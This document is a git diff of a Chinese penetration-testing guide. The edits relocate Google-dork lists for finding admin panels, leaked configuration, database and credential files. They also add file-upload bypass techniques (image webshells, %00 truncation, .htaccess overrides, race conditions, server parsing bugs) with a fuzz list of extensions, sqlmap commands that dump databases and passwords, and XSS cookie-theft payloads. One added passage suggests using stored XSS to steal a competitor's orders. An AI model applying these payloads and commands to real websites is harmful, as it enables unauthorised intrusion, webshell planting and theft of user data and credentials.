@@ -3,9 +3,8 @@
 
 @[toc]
 **作者：洪七**
-
 本文开始于2021/4/27
-
+预计2022年完成
 # 写在前面
 **qq交流群：942443861**
 文章链接：https://github.com/ngadminq/Hong-Qigong-penetration-test-guide
@@ -13,8 +12,10 @@
 文章一部分来源于一些大佬博客或者书籍总结，剩下的是自己实战的经验总结，至于优质的资源参考链接都有罗列在本文章里。
 
 
-
+****
 *待补充：简要介绍每一章节讲了什么，应该如何阅读*
+*待补充：每一种漏洞介绍经验，常见什么形式展现，从源码层面做分析*
+*将文章拆分为：原理版和实践版*
 # 准备工作
 
 
@@ -1621,128 +1622,8 @@ hping3
 常见端口攻击:https://www.cnblogs.com/botoo/p/10475402.html
 
 **找后台页面**
-**google hacking 语法**
-1、intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件
-2、intitle： 把网页标题中的某个字符作为搜索的条件
-3、cache： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息
-4、filetype/ext： 指定一个格式类型的文件作为搜索对象
-5、inurl： 搜索包含指定字符的URL
-6、site： 在指定的(域名)站点搜索相关内容　　
-GoogleHacking其他语法
-1、引号 ” ” 把关键字打上引号后，把引号部分作为整体来搜索
-2、or 同时搜索两个或更多的关键字
-3、link 搜索某个网站的链接 link:http://baidu.com即返回所有和baidu做了链接的URL
-4、info 查找指定站点的一些基本信息　　GoogleHackingDatabase:
-google-hacking-databaseGoogleHacking典型用法(特定资产的万能密码也要积累)
-
-管理后台地址
-inurl:"login"|inurl:"logon"|inurl:"admin"|inurl:"manage"|inurl:"manager"|inurl:"member"|inurl:"admin_login"|inurl:"ad_login"|inurl:"ad_manage"|inurl:"houtai"|inurl:"guanli"|inurl:"htdl"|inurl:"htgl"|inurl:"members"|inurl:"system"(|inurl:...) (-忽略的文件名)
-
-错误消息
-
-(site:域名) intext:"error"|intext:"warning"|intext:"for more information"|intext:"not found"|intext:"其他错误消息" (-排除的信息)
-
-数据库的转储
-
-(site:域名) # Dumping data for table(user|username|password|pass) (-排除的信息)
 
 
-更多组合 我们可以把自己的搜索与能获取更好的结果的搜索项一起使用
-
-1.当查找email时，能添加类似 通讯录 邮件 电子邮件 发送这种关键词
-
-2.查找电话号码的时候可以使用一些类似 电话 移动电话 通讯录 数字 手机
-
-
-用户名相关
-(site:域名) intext:"username"|intext:"userid"|intext:"employee.ID"(|intext:...) "your username is" (-排除的信息)
-
-密码相关
-
-(site:域名) intext:"password"|intext:"passcode"(|intext:...) "your password is" "reminder forgotten" (-排除的信息)
-
-公司相关
-
-(site:域名) intext:"admin"|intext:"administrator"|intext:"contact your system"|intext:"contact your administrator" (-排除的信息)
-
-web 服务器的软件错误消息
-
-（site:域名）intitle:"Object not found!" "think this is a server error" (-排除的信息)
-
-各种网络硬件设备
-
-"Version Info" "BootVesion" "Internet Settings" 能找到 Belkin Cable/DSL路由器 ......
-site:http://target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录
-
-```bash
-site:"www.baidu.com" intitle:login intext:管理|后台|登录|用户名|密码|验证码|系统|账号|manage|admin|login|system
-```
-
-上传类漏洞地址
-
-site:http://target.com inurl:file
-site:http://target.com inurl:upload
-
-注入页面
-
-site:http://target.com inurl:php?id=
-（批量注入工具、结合搜索引擎）
-
-编辑器页面
-site:http://target.com inurl:ewebeditor
-
-目录遍历漏洞
-site:http://target.com intitle:index.of
-
-SQL错误
-
-site:http://target.com intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:”Warning: mysql_query()" | intext:”Warning: pg_connect()"
-
-phpinfo()
-
-site:http://target.com ext:php intitle:phpinfo "published by the PHP Group"
-
-配置文件泄露
-
-```bash
-site:http://target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini
-```
-
-数据库文件泄露
-
-```bash
-site:http://target.com ext:.sql | .dbf | .mdb | .db
-```
-
-日志文件泄露
-
-```bash
-site:http://target.com ext:.log
-```
-
-备份和历史文件泄露
-
-```bash
-site:http://target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar
-```
-
-公开文件泄露
-
-```bash
-site:http://target.com filetype:.doc .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv
-```
-
-邮箱信息
-
-```bash
-site:http://target.com intext:邮件 | email |@http://target.com 
-```
-
-社工信息
-
-```bash
-site:http://target.com intitle:账号 | 密码 | 工号 | 学号 | 身份z
-```
 
 ### 获取路径
 
@@ -1822,7 +1703,7 @@ php 探针
 御剑后台扫描珍藏版下载网站](https://www.nnapp.cn/?post=211)；御剑55w增强版字典[文章有百度网盘链接](https://www.icode9.com/content-4-87412.html); 御剑85w 字典：http://www.coder100.com/index/index/content/id/833812
 
 使用十分简单。但是我在对同一个站点进行扫描两次的时候，发现结果不一样，因为我网速不好，但采用了默认的中断时常3秒。但目录有限，四万多很多都是php文件路径，目录路径，如果你的电脑能受得了。可以选择........
-
+更正：也可以是ip
 ![御剑](https://img-blog.csdnimg.cn/20210609115717971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
@@ -1839,7 +1720,7 @@ kali自带ka的一款工具，fuzz很方便。kali中直接在命令行中输入
 简单来说就是不同服务器上的不同站点，网站搭建用不同的服务器搭建不同的站点，但都属于同一个站点，我们可以攻击其中一个网站，通过内网渗透从而获取其他网站的权限。
 
 在线C段查询：https://chapangzhan.com/
-**旁注**
+
 
 **公司信息收集：招股书**
 招股书涵盖的信息量很大，且容易获得，只需要用搜索引擎搜素：xxx招股书，即可获得。而其中许多公司得招股书中，**会有大量得资产域名**。在招股书中，其中目标公司股权结构也非常清晰。目标公司重要人员的其他重要信息也非常清晰：例如**手写签名：（用于后期钓鱼）**。
@@ -1864,13 +1745,131 @@ kali自带ka的一款工具，fuzz很方便。kali中直接在命令行中输入
 工具这一部分最重要的不是看我的简介，而是及时上手
 
 ## 学会上网
-
-### 科学上网
-
 ### google hack
+1、intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件
+2、intitle： 把网页标题中的某个字符作为搜索的条件
+3、cache： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息
+4、filetype/ext： 指定一个格式类型的文件作为搜索对象
+5、inurl： 搜索包含指定字符的URL
+6、site： 在指定的(域名)站点搜索相关内容　　
+GoogleHacking其他语法
+1、引号 ” ” 把关键字打上引号后，把引号部分作为整体来搜索
+2、or 同时搜索两个或更多的关键字
+3、link 搜索某个网站的链接 link:http://baidu.com即返回所有和baidu做了链接的URL
+4、info 查找指定站点的一些基本信息　　GoogleHackingDatabase:
+google-hacking-databaseGoogleHacking典型用法(特定资产的万能密码也要积累)
 
+管理后台地址
+inurl:"login"|inurl:"logon"|inurl:"admin"|inurl:"manage"|inurl:"manager"|inurl:"member"|inurl:"admin_login"|inurl:"ad_login"|inurl:"ad_manage"|inurl:"houtai"|inurl:"guanli"|inurl:"htdl"|inurl:"htgl"|inurl:"members"|inurl:"system"(|inurl:...) (-忽略的文件名)
+
+错误消息
+
+(site:域名) intext:"error"|intext:"warning"|intext:"for more information"|intext:"not found"|intext:"其他错误消息" (-排除的信息)
+
+数据库的转储
+
+(site:域名) # Dumping data for table(user|username|password|pass) (-排除的信息)
+
+
+更多组合 我们可以把自己的搜索与能获取更好的结果的搜索项一起使用
+
+1.当查找email时，能添加类似 通讯录 邮件 电子邮件 发送这种关键词
+
+2.查找电话号码的时候可以使用一些类似 电话 移动电话 通讯录 数字 手机
+
+
+用户名相关
+(site:域名) intext:"username"|intext:"userid"|intext:"employee.ID"(|intext:...) "your username is" (-排除的信息)
+
+密码相关
+
+(site:域名) intext:"password"|intext:"passcode"(|intext:...) "your password is" "reminder forgotten" (-排除的信息)
+
+公司相关
+
+(site:域名) intext:"admin"|intext:"administrator"|intext:"contact your system"|intext:"contact your administrator" (-排除的信息)
+
+web 服务器的软件错误消息
+
+（site:域名）intitle:"Object not found!" "think this is a server error" (-排除的信息)
+
+各种网络硬件设备
+
+"Version Info" "BootVesion" "Internet Settings" 能找到 Belkin Cable/DSL路由器 ......
+site:http://target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录
+
+```bash
+site:"www.baidu.com" intitle:login intext:管理|后台|登录|用户名|密码|验证码|系统|账号|manage|admin|login|system
+```
+
+上传类漏洞地址
+
+site:http://target.com inurl:file
+site:http://target.com inurl:upload
+
+注入页面
+
+site:http://target.com inurl:php?id=
+（批量注入工具、结合搜索引擎）
+
+
+目录遍历漏洞
+site:http://target.com intitle:index.of
+
+SQL错误
+
+site:http://target.com intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:”Warning: mysql_query()" | intext:”Warning: pg_connect()"
+
+phpinfo()
+
+site:http://target.com ext:php intitle:phpinfo "published by the PHP Group"
+
+配置文件泄露
+
+```bash
+site:http://target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini
+```
+
+数据库文件泄露
+
+```bash
+site:http://target.com ext:.sql | .dbf | .mdb | .db
+```
+
+日志文件泄露
+
+```bash
+site:http://target.com ext:.log
+```
+
+备份和历史文件泄露
+
+```bash
+site:http://target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar
+```
+
+公开文件泄露
+
+```bash
+site:http://target.com filetype:.doc .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv
+```
+
+邮箱信息
+
+```bash
+site:http://target.com intext:邮件 | email |@http://target.com 
+```
+
+社工信息
+
+```bash
+site:http://target.com intitle:账号 | 密码 | 工号 | 学号 | 身份z
+```
 ### 暗网
 
+暗网下载链接，官方网址 https://www.torproject.org/zh-CN/download/   使用也很简单，我直接全点下一步安装，电脑挂上我的VPN，就可以轻松上网。
+
+*待完善：暗网黑客资源*
 ### 空间搜索引擎
 
 大多数空间搜索引擎爬虫相比于谷歌百度等都更及时和更深层，比如通常爬几分钟之前.使用的时候你应该将ip或url测试所有的空间搜索引擎工具，因为它得到的结果是不一样的。
@@ -2005,7 +2004,6 @@ IP最大范围限制65536个
 ### sqlmap
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070720543128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-sqlmap拥有很多功能强力的插件，插件的使用方法： -- tamper “插件名称”
 
 ### 蚁剑
 
@@ -2425,7 +2423,7 @@ Discover Content是Burp中专门用于此目的的工具。
 Burp Intruder也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)，爆破、注入等。
 FuzzDB包含一些用于此目的的非常牛逼的字典。
 
-burpsuite当抓不到包时，可能是目标网站是个无发送数据包的网站，比如只有一些静态的js代码，你的交互都是在目标主机本机运行，因此就不会展示数据包
+burpsuite当抓不到包时，可能是目标网站是个无发送数据包的网站，比如只有一些静态的js代码，你的交互都是在目标主机本机运行，因此就不会展示数据包。比如你也许认为上传操作都可以抓到数据包，然而事实上是有的数据包是js操作，所以根本就不会反馈数据包给你
 
 ##### 插件
 
@@ -2621,11 +2619,11 @@ rdesktop 10.101.2.11
 
 一个任意链接特殊字符意义：  *https://www.baidu.com/s?ie=UTF-8&wd=owasp&tn=88093251_74_hao_pg*  用？隔开参数和资源，字段之间用&分开。有的网站如果只利用Content-Type字段判断文件类型，那么修改了就能恶意上传文件了。
 
-# 二进制：攻击
+# 待补充：二进制：攻击
 
 会不会二进制安全相关的东西（逆向、破解、浏览器、系统内核）
 
-# 系统：攻击
+# 待补充：系统：攻击
 
 ## 经典漏洞
 
@@ -2895,7 +2893,6 @@ weblogic的反序列化
 上传恶意文件进行钓鱼
 尝试在上传的文件名前加../进行目录穿越。
 可以结合其他漏洞比如CORS漏洞扩大危害。
-文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。
 
 字典生成 https://github.com/c0ny1/upload-fuzz-dic-builder
 
@@ -2903,15 +2900,9 @@ weblogic的反序列化
 上传后如果没有被文件重命名，可以在文件名值做目录跳转
 注意一些像目录的参数名
 dir　path　location　url
-文件头绕过
-修改上传类型 Content-Type
 
-双文件上传
-
-截断
 长文件名
 长Content-Disposition
-%00截断
 特殊文件
 svg / html / htm / swf
 xss
@@ -2953,16 +2944,27 @@ YAML 反序列化
 @=2222-1
 \r\n=2222-1
 111,=2222-1,
-**检查绕过机制**
 
+**经验**
+上传参数名解析：明确那些东西能修改？
+Contont-Disposition：一般可更改
+Name：表单参数值，不能更改
+Filename：文件名，可以更改
 ### 执行
-#### 图片马
-##### +解析漏洞
+##### 明確只能上传图片
+比如程序员写了要获取图片尺寸的或
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709135957977.png)
+
+这时候你就需要配合其他漏洞才可以执行。
+#### +解析漏洞
 解析漏洞存在的条件是比较苛刻的，他要求是nginx、apache等服务器；*具体待补充*
-**制作图片马**
 图片马制作很简单，你可以轻松的上传它，但是如何执行起来就是另一项技术。
 生成在同级文件下放入一句话木马和图，将其在win的cmd下输入
+
+```bash
 copy 1.jpg /b+1.php/a 1.jpg
+```
+
 和在一起后上传图片。
 或者
 你右击打开图片用编辑器编辑它，在尾巴后面加上php代码`<?php phpinfo();?>`
@@ -2970,27 +2972,126 @@ copy 1.jpg /b+1.php/a 1.jpg
 当上传成功图片后会正确显示，如果对方存在解析漏洞，在图片的地址后加上/1.php就会导致图片被执行成脚本，图片的尾巴代码就会被执行出
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708212810712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
+判断一个网站有没有解析漏洞只需要访问其jpg文件，在加上`/.php`看返回结果就知道了.如果返回的是404就证明没有漏洞，如果是乱码就证明有漏洞
+#### +文件包含漏洞
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709135206289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709135133834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+#### + IIS6.0上传漏洞
+现在这个版本已经不太常见了
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709153926671.png)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070915424534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+#### + Apache解析漏洞-低版本2.X
+符合Apache低版本就有漏洞
+x.php.xxx.yyy
+识别最后的yyy，如果不识别的就向前解析，直到识别。
+利用场景：
+如果对方中间件apache属于低版本，我们可以利用文件上传，上传一个不识别的文件后缀，利用解析漏洞规则成功解析文件，其中后门代码被触发。
+#### +Apache2.4.0-2.4.29换行解析
+换行解析漏洞
+https://vulhub.org/#/environments/httpd/CVE-2017-15715/
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709161011292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+Nginx解析漏洞-vulhub
+
+Nginx文件名逻辑-vulhub
+
+各个WEB编辑器安全讲解
+网站后台里面有操作添加文字等类似功能的时候，有些网站会套用第三方的编辑器去对文章、图片、音频等进行相关处理。如果一个网站里面有编辑器的话，那么这个编辑器是什么类型，有没有漏洞，也会成为我们利用条件。
+
+https://navisec.it/编辑器漏洞手册/
+各个CMS文件上传简要讲解
+wordpress，phpcms
+
+#### 待补充： +weblogic
+#### +firecms上传漏洞
+修改uid为3
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708230507178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708230515619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+#### 待补充：+CVE-2017-12615:tomcat任意文件上传
+#### +竞态
+二次渲染就是当系统收到用户上传的图片时，先进行保存到服务器，或者是为了方便用户进行图片的删除或者改大小。这通常就涉及到两次保存，一般程序员在保存第一次时可能疏忽不会写冗长的代码来过滤。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709142526875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+只要成功保存一次，对于我们其实就够了，利用竞态，在文件被服务器删除之前访问。这时候对于系统来说就是打开了文件，打开就不能进行删除了。你制造竞态只需要不断请求修改数据包即可
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709144403839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
-### 上传绕过
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709143746379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709143902195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+启动爆破后，打开网页对php进行多次刷新访问，如果弹出一串奇怪的代码那就说明你已经执行成功了。这时候你要做的就是停止再刷新界面，将此界面保持就可以进行后门操作
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709144624895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+#### 编辑器
+这里不用说太多，只要你发现对方采用了编辑器，百度编辑器漏洞就可以找到利用方法。如图就采用了一个编辑器
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709172009109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-* 最老套的方法是用Content-Type值判断的，这时候比如服务器只能允许上传image/jpeg，那么上传了php后，通过burpsuite拦截，可以看到content-type变为了application/octet-stream，在家content-Type改为image/jpeg就能完成上传。
+
+#### 常规上传
+
+* 文件夹绕过
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709151241163.png)
+
+
 * Apache。解析顺序中，是从右往左开始解析后缀的，如果遇到1.php.xxx，那么1.php就会被解析
 * 如果后端有读取图像类型比如getimagesize()如果错误那么你将不会被上传成功，这时候你可以将图片和webshell合并一个文件，命令是 cat 1.jpg 2.php > webshell.php
 * 竞态条件上传，在系统将你的php删除之前，在网站中调用的你php文件，那么代码就会被保留。
-* php小于5.3.4会把00后面字符删除。上传name=1.php%00.jpg
+* php小于5.3.4会把00后面字符删除。上传name=1.php%00.jpg只需要注意一点是get会自动解码 %00
+post不会解码需要上传数据时将 %00转换为url编码
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709132837178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+
 * 前端JS检测绕过。当然如果文件从前端过来后，后端仍旧对格式有上传后缀名判断，这种方式是行不通的
 * ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512185959272.png)
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512190248641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+  
+ * 如果php5 php3 phtml..没有定义到后名单里，可以用这格式绕过限制值得注意的点是，如果目标网站的程序员修改了设置执行这种代码的文件（默认是开启的，脚本可执行的），你就无法执行该文件，上传的脚本就像一个文本一样躺在那里
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709010254367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-### 配合
-cms漏洞
-解析漏洞
+
+* 最老套的方法是用Content-Type值判断的，这时候比如服务器只能允许上传image/jpeg，那么上传了php后，通过burpsuite拦截，可以看到content-type变为了application/octet-stream，在加上content-Type改为image/jpeg就能完成上传。但是如果目标网站开启了WAF这种方法仍旧行不通。
+* windows解析php特有技巧，将.php文件加上`：：&DATA`
+* 将上传名加一个空格`1.php `，这样你可能绕过开发者写的匹配规则。但是文件上传到系统后是会强行去掉你加的空格，这样你的文件就能保证成功执行了。类似的还有加上`.`
+
+* 简要上传表单代码分析解释
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709002346399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+* .htaccess文件配置覆盖。当没有过滤.htaccess文件时，这个漏洞可以被执行。执行方法是1.创建.htaccess文件
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709011811865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+下载一张后缀名为jpg的图片，把图片名改为shana，打开图片，在最后增加一行php代码，然后上传
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709011838515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+* 代码替换关键字
 
 
-### 木马
+>代码将字符串里的php替换为空
+一次过滤
+a.php -> a.
+a.pphphp -> a.php
 
-木马和webshell区别
+>循环过滤 递归过滤
+a.pphphp -> a.
+
+以下字典是我根据本文的方法进行的初步总结，但这样的字典明显太小，你需要用网上公开的fuzz字典，推荐一个 https://github.com/c0ny1/upload-fuzz-dic-builder
+```bash
+.
+ 
+::$$DATA
+.php3
+.php5
+. .
+.pphphp
+%00.jpg
+.PHp3
+%00.jpg
+/.jpg
+;.jpg
+.xxx
+;.php
+.p\nh\np
+
+```
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709192845136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
 
@@ -3450,32 +3551,32 @@ sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IB
 ```python
 # 1.判断链接是否可注入
 # 手工:当你想要寻找界面是否含有注入点，你应该警惕源码中含有?的URL链接测试比如？id=1和？id=1'看界面返回区别，或者是附上？id=1 and 1=1 和？id=1 and 1=2；或者是+1 和-1 注意这里+在url编码中有特殊含义，记得将+编码为%2b
-python sqlmap.py -u URL --level 5 --batch #  当url参数大于1时需要将url用“”引起来。
+sqlmap -u URL --level 5 --batch --random-agent#  当url参数大于1时需要将url用“”引起来。
 
 
 # 2. 如果可注入，查询当前用户下所有数据库。不可注入的话，就没有后续步骤了。
 # 手工: order by 3
 # 手工: id=-1 union select 1, database(), 3 # UNION的作用是将两个select查询结果合并
-python sqlmap.py -u URL --dbs # --dbs也可以缩写为-D
+sqlmap -u URL --dbs # --dbs也可以缩写为-D
 
 # 3. 如果可查询到数据库，则进行查询数据库中表名
-python sqlmap.py -u URL -D 数据库名  --tables # --tables可以缩写为-T
+sqlmap -u URL -D 数据库名  --tables # --tables可以缩写为-T
 
 # 4.规则同上
-python sqlmap.py -u URL -D 数据库名  -T 表名 --columns 
+sqlmap -u URL -D 数据库名  -T 表名 --columns 
 
 
 # 5.规则同上，字段内容
-python sqlmap.py -u URL -D 数据库名  -T 表名  -C 列名 --dump
+sqlmap -u URL -D 数据库名  -T 表名  -C 列名 --dump
 ```
 
 其他有用命令
 
 ```python
-python sqlmap.py -u URL --users
-python sqlmap.py -u URL --passwords # 要是密码加密请在网站cmd5中解密
-python sqlmap.py -u URL --current-db
-python sqlmap.py -u URL --current-user
+sqlmap -u URL --users
+sqlmap -u  URL --passwords # 要是密码加密请在网站cmd5中解密
+sqlmap -u URL --current-db
+sqlmap -u URL --current-user
 ```
 
 你可以点击以下文章以便了解更多使用
@@ -3811,7 +3912,61 @@ cookie注入 后接cookie值
 当网站依靠cookie结果做数据库查询，且不做过多的防护就会存在注入
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705235758892.png)
 
-## xss技巧
+## xss攻击
+xss攻击执行的是javascript脚本，javascript脚本能执行多强就意味着xss能达到什么样的攻击
+
+
+#### 反射型
+
+**Cookie盗取**
+Cookie 窃取XSS 。诱导用户去点击你含有cookie切入的链接，比如你可以将自己用户名改`<script>alert(document.cookie)</script>`  向用户去求分享链接，比如百度网盘之前一漏洞：有人用户名为此，当别人给他账号分享文件时，就会弹出此用户的cookie。
+
+```python
+url/?name=<script>alert(document.cookie)</script>
+```
+
+**xss脚本**
+
+```bash
+<img src=1 onerror=alert(1);>
+' onclick="alert(2)">
+
+```
+
+#### 持久型
+数据写在了服务器中
+**玩法: 盗取竞争对手订单**
+去竞争对手网站购买东西，填写订单信息如电话号码等时导入对方的cookie
+#### DOM型
+写过前端界面的人都能很好理解什么是DOM型，即用户进行某种操作如点击onclick关联了前端脚本函数。这种漏洞你可以看到源码，而前两种不可以
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520191509433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+
+
+ign()这些方法通过Javascript实现跳转。我们第一时间可能想到的是限制不严导致任意URL跳转漏洞，而DOM XSS与此似乎“八竿子打不着”，实际上跳转部分参数可控，可能导致Dom xss。
+
+首先我们来看个简单的例子:
+
+var hash = location.hash;
+if(hash){
+    var url = hash.substring(1);
+    location.href = url;
+}
+那么可以使用伪协议#javascript:alert(1)。
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520190651246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+
+
+
+
+
+
+强制下载文件
+重定向用户
+其他脚本以启用键盘记录器，拍照等
+网络钓鱼、窃取用户Cookies、弹广告刷流量、具备改页面信息、删除文章、获取客户端信息、传播蠕虫
+
 
 csp没如何绕过，dom型xss和反射型xss区别，xss获取cookie如何绕过http-only等一些。
 
@@ -3827,8 +3982,9 @@ xss payload字典 burp爆破　
 搭建XSS平台 3s.wf/
 http://xssor.io
 
-### xss平台
 
+### xss平台
+如果你搞的东西比较敏感，不希望别人知道也可以自己搭建一个
 #### 使用
 
 以下为链接为  https://xsshs.cn 的平台，其他XSS平台使用类似
@@ -3871,54 +4027,6 @@ xss平台持久cookie说明 keepsession说明    https://woj.app/1907.html
 
 
 
-### XSS攻击类型
-
-#### 反射型
-
-**Cookie盗取**
-Cookie 窃取XSS 。诱导用户去点击你含有cookie切入的链接，比如你可以将自己用户名改`<script>alert(document.cookie)</script>`  向用户去求分享链接，比如百度网盘之前一漏洞：有人用户名为此，当别人给他账号分享文件时，就会弹出此用户的cookie。
-
-```python
-url/?name=<script>alert(document.cookie)</script>
-```
-
-**加粗样式**
-
-```bash
-<img src=1 onerror=alert(1);>
-```
-
-#### 持久型
-
-#### DOM型
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520191509433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-
-
